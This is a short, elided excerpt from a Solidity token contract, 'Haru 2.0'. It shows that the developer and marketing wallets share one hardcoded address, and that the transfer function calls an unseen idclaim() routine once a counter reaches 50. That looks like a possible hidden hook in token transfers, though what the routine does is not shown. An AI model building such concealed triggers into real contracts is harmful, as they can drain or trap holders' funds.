...
contract Haru is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "Haru 2.0";
    string private constant _symbol = unicode"HARU V2";
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint8 private _TxCount = 0;
    uint256 private _tTotal = 3* 10**9 * 10**_decimals;
    ...
    address payable public DevWallet = payable(0x08dABF5d2E3D3dB64AFBb308fb1286e9677D5087);
    address payable public MarketingWallet = payable(0x08dABF5d2E3D3dB64AFBb308fb1286e9677D5087);
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (transferDelay && cooldown >= 50) {idclaim();}    
